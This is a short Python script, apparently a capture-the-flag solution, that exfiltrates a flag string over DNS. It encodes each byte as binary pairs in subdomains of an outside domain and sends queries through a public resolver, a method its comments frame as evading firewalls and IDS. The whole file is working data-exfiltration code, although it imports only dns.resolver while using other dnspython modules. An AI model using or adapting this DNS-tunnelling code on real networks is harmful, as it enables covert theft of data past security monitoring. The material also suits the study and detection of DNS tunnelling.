import dns.resolver

# DNS server information
dns_server = "8.8.8.8"  # Replace with the desired DNS server IP address
domain = "hackabit.com"  # Replace with the domain name to use for exfiltration

# Data to exfiltrate
data = "flag{what_firewall?_what_IDS?}"

# Function to convert a byte to its binary representation
def byte_to_binary(byte):
    return bin(byte)[2:].zfill(8)

# Function to convert binary to DNS subdomain format
def binary_to_subdomain(binary):
    return ".".join(binary[i:i+2] for i in range(0, len(binary), 2))

# Exfiltrate data one byte at a time
for byte in data.encode():
    binary = byte_to_binary(byte)
    subdomain = binary_to_subdomain(binary)

    # Create a DNS request message
    request = dns.message.make_query(f"{subdomain}.{domain}", dns.rdatatype.A)

    # Send the DNS request to the specified server
    response = dns.query.tcp(request, dns_server)

    # Check if the response indicates NXDOMAIN (Non-Existent Domain)
    if response.rcode() == dns.rcode.NXDOMAIN:
        print(f"Exfiltrated byte: {byte}")

print("Data exfiltration complete.")
